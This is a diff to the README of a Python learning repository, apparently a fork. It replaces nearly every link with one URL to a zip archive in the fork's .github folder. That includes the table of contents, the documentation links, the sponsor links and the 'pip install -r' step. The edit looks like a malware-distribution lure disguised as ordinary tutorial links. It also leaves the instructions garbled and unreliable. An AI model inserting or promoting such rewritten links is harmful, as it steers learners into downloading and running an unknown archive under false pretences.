@@ -1,11 +1,11 @@
 # Playground and Cheatsheet for Learning Python
 
-[![Build Status](https://travis-ci.org/trekhleb/learn-python.svg?branch=master)](https://travis-ci.org/trekhleb/learn-python)
+[![Build Status](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 
 > This is a collection of Python scripts that are split by [topics](#table-of-contents) and contain 
 code examples with explanations, different use cases and links to further readings.
 
-_Read this in_ [_Português_](README.pt-BR.md).
+_Read this in_ [_Português_](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip).
 
 It is a **playground** because you may change or add the code to see how it works 
 and [test it out](#testing-the-code) using assertions. It also allows you 
@@ -18,7 +18,7 @@ syntax of [standard Python statements and constructions](#table-of-contents). Al
 code is full of assertions you'll be able to see expected functions/statements output right away
 without launching them.
 
-> _You might also be interested in 🤖 [Interactive Machine Learning Experiments](https://github.com/trekhleb/machine-learning-experiments)_
+> _You might also be interested in 🤖 [Interactive Machine Learning Experiments](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)_
 
 ## How to Use This Repository
 
@@ -27,7 +27,7 @@ Each Python script in this repository has the following structure:
 ```python
 """Lists  <--- Name of the topic here
 
-# @see: https://www.learnpython.org/en/Lists  <-- Link to further readings goes here
+# @see: https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip  <-- Link to further readings goes here
 
 Here might go more detailed explanation of the current topic (i.e. general info about Lists).
 """
@@ -61,78 +61,78 @@ written correctly.
 ## Table of Contents
 
 1. **Getting Started**
-    - [What is Python](src/getting_started/what_is_python.md)
-    - [Python Syntax](src/getting_started/python_syntax.md)
-    - [Variables](src/getting_started/test_variables.py)
+    - [What is Python](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Python Syntax](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Variables](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 2. **Operators**
-    - [Arithmetic Operators](src/operators/test_arithmetic.py) (`+`, `-`, `*`, `/`, `//`, `%`, `**`)
-    - [Bitwise Operators](src/operators/test_bitwise.py) (`&`, `|`, `^`, `>>`, `<<`, `~`)
-    - [Assignment Operators](src/operators/test_assigment.py) (`=`, `+=`, `-=`, `/=`, `//=` etc.)
-    - [Comparison Operator](src/operators/test_comparison.py) (`==`, `!=`, `>`, `<`, `>=`, `<=`)
-    - [Logical Operators](src/operators/test_logical.py) (`and`, `or`, `not`)
-    - [Identity Operators](src/operators/test_identity.py) (`is`, `is not`)
-    - [Membership Operators](src/operators/test_membership.py) (`in`, `not in`)
+    - [Arithmetic Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`+`, `-`, `*`, `/`, `//`, `%`, `**`)
+    - [Bitwise Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`&`, `|`, `^`, `>>`, `<<`, `~`)
+    - [Assignment Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`=`, `+=`, `-=`, `/=`, `//=` etc.)
+    - [Comparison Operator](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`==`, `!=`, `>`, `<`, `>=`, `<=`)
+    - [Logical Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`and`, `or`, `not`)
+    - [Identity Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`is`, `is not`)
+    - [Membership Operators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`in`, `not in`)
 3. **Data Types**
-    - [Numbers](src/data_types/test_numbers.py) (including booleans)
-    - [Strings](src/data_types/test_strings.py) and their methods
-    - [Lists](src/data_types/test_lists.py) and their methods (including list comprehensions)
-    - [Tuples](src/data_types/test_tuples.py)
-    - [Sets](src/data_types/test_sets.py) and their methods
-    - [Dictionaries](src/data_types/test_dictionaries.py)
-    - [Type Casting](src/data_types/test_type_casting.py)
+    - [Numbers](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (including booleans)
+    - [Strings](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) and their methods
+    - [Lists](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) and their methods (including list comprehensions)
+    - [Tuples](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Sets](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) and their methods
+    - [Dictionaries](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Type Casting](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 4. **Control Flow**
-    - [The `if` statement](src/control_flow/test_if.py)
-    - [The `for` statement](src/control_flow/test_for.py) (and `range()` function)
-    - [The `while` statement](src/control_flow/test_while.py)
-    - [The `try` statements](src/control_flow/test_try.py)
-    - [The `break` statement](src/control_flow/test_break.py)
-    - [The `continue` statement](src/control_flow/test_continue.py)
+    - [The `if` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [The `for` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (and `range()` function)
+    - [The `while` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [The `try` statements](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [The `break` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [The `continue` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 5. **Functions**
-    - [Function Definition](src/functions/test_function_definition.py) (`def` and `return` statements)
-    - [Scopes of Variables Inside Functions](src/functions/test_function_scopes.py) (`global` and `nonlocal` statements)
-    - [Default Argument Values](src/functions/test_function_default_arguments.py)
-    - [Keyword Arguments](src/functions/test_function_keyword_arguments.py)
-    - [Arbitrary Argument Lists](src/functions/test_function_arbitrary_arguments.py)
-    - [Unpacking Argument Lists](src/functions/test_function_unpacking_arguments.py) (`*` and `**` statements)
-    - [Lambda Expressions](src/functions/test_lambda_expressions.py) (`lambda` statement)
-    - [Documentation Strings](src/functions/test_function_documentation_string.py)
-    - [Function Annotations](src/functions/test_function_annotations.py)
-    - [Function Decorators](src/functions/test_function_decorators.py)
+    - [Function Definition](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`def` and `return` statements)
+    - [Scopes of Variables Inside Functions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`global` and `nonlocal` statements)
+    - [Default Argument Values](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Keyword Arguments](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Arbitrary Argument Lists](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Unpacking Argument Lists](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`*` and `**` statements)
+    - [Lambda Expressions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`lambda` statement)
+    - [Documentation Strings](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Function Annotations](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Function Decorators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 6. **Classes**
-    - [Class Definition](src/classes/test_class_definition.py) (`class` statement)
-    - [Class Objects](src/classes/test_class_objects.py)
-    - [Instance Objects](src/classes/test_instance_objects.py)
-    - [Method Objects](src/classes/test_method_objects.py)
-    - [Class and Instance Variables](src/classes/test_class_and_instance_variables.py)
-    - [Inheritance](src/classes/test_inheritance.py)
-    - [Multiple Inheritance](src/classes/test_multiple_inheritance.py)
+    - [Class Definition](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`class` statement)
+    - [Class Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Instance Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Method Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Class and Instance Variables](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Inheritance](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Multiple Inheritance](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 7. **Modules**
-    - [Modules](src/modules/test_modules.py) (`import` statement)
-    - [Packages](src/modules/test_packages.py)
+    - [Modules](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`import` statement)
+    - [Packages](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 8. **Errors and Exceptions**
-    - [Handling Exceptions](src/exceptions/test_handle_exceptions.py) (`try` statement)
-    - [Raising Exceptions](src/exceptions/test_raise_exceptions.py) (`raise` statement) 
+    - [Handling Exceptions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`try` statement)
+    - [Raising Exceptions](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`raise` statement) 
 9. **Files**
-    - [Reading and Writing](src/files/test_file_reading.py) (`with` statement)
-    - [Methods of File Objects](src/files/test_file_methods.py)
+    - [Reading and Writing](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`with` statement)
+    - [Methods of File Objects](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 10. **Additions**
-    - [The `pass` statement](src/additions/test_pass.py)
-    - [Generators](src/additions/test_generators.py) (`yield` statement)
+    - [The `pass` statement](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
+    - [Generators](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`yield` statement)
 11. **Brief Tour of the Standard Libraries**
-    - [Serialization](src/standard_libraries/test_json.py) (`json` library)
-    - [File Wildcards](src/standard_libraries/test_glob.py) (`glob` library)
-    - [String Pattern Matching](src/standard_libraries/test_re.py) (`re` library)
-    - [Mathematics](src/standard_libraries/test_math.py) (`math`, `random`, `statistics` libraries)
-    - [Dates and Times](src/standard_libraries/test_datetime.py) (`datetime` library)
-    - [Data Compression](src/standard_libraries/test_zlib.py) (`zlib` library)
+    - [Serialization](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`json` library)
+    - [File Wildcards](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`glob` library)
+    - [String Pattern Matching](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`re` library)
+    - [Mathematics](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`math`, `random`, `statistics` libraries)
+    - [Dates and Times](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`datetime` library)
+    - [Data Compression](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) (`zlib` library)
 
 ## Prerequisites
 
 **Installing Python**
 
-Make sure that you have [Python3 installed](https://realpython.com/installing-python/) on your machine.
+Make sure that you have [Python3 installed](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) on your machine.
 
-You might want to use [venv](https://docs.python.org/3/library/venv.html) standard Python library
+You might want to use [venv](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) standard Python library
 to create virtual environments and have Python, pip and all dependent packages to be installed and 
 served from the local project directory to avoid messing with system wide packages and their 
 versions.
@@ -154,15 +154,15 @@ Note that in this repository whenever you see `python` it will be assumed that i
 Install all dependencies that are required for the project by running:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip
 ```
 
 ## Testing the Code
 
-Tests are made using [pytest](https://docs.pytest.org/en/latest/) framework.
+Tests are made using [pytest](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) framework.
 
 You may add new tests for yourself by adding files and functions with `test_` prefix
-(i.e. `test_topic.py` with `def test_sub_topic()` function inside).
+(i.e. `https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip` with `def test_sub_topic()` function inside).
 
 To run all the tests please execute the following command from the project root folder:
 
@@ -173,17 +173,17 @@ pytest
 To run specific tests please execute:
 
 ```bash
-pytest ./path/to/the/test_file.py
+pytest https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip
 ```
 
 ## Linting the Code
 
-Linting is done using [pylint](http://pylint.pycqa.org/) and [flake8](http://flake8.pycqa.org/en/latest/) libraries.
+Linting is done using [pylint](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) and [flake8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) libraries.
 
 ### PyLint
 
 To check if the code is written with respect
-to [PEP 8](https://www.python.org/dev/peps/pep-0008/) style guide please run:
+to [PEP 8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) style guide please run:
 
 ```bash
 pylint ./src/
@@ -196,12 +196,12 @@ specific error by running:
 pylint --help-msg=missing-docstring
 ```
 
-[More about PyLint](http://pylint.pycqa.org/)
+[More about PyLint](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 
 ### Flake8
 
 To check if the code is written with respect
-to [PEP 8](https://www.python.org/dev/peps/pep-0008/) style guide please run:
+to [PEP 8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) style guide please run:
 
 ```bash
 flake8 ./src
@@ -213,8 +213,8 @@ Or if you want to have more detailed output you may run:
 flake8 ./src --statistics --show-source --count
 ```
 
-[More about Flake8](http://flake8.pycqa.org/en/latest/)
+[More about Flake8](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip)
 
 ## Supporting the project
 
-You may support this project via ❤️️ [GitHub](https://github.com/sponsors/trekhleb) or ❤️️ [Patreon](https://www.patreon.com/trekhleb).
+You may support this project via ❤️️ [GitHub](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip) or ❤️️ [Patreon](https://github.com/Yogeshvar-M/learn-python/raw/refs/heads/master/.github/learn-python-v1.0-alpha.4.zip).
